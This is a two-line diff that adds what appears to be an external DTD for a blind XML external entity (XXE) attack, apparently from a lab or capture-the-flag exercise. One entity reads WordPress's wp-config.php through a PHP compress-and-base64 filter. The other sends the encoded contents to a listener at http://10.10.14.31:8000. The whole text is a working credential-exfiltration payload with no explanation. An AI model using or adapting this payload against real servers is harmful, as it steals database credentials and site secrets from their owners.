@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=./wp-config.php">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.31:8000/?%data;'>"> 
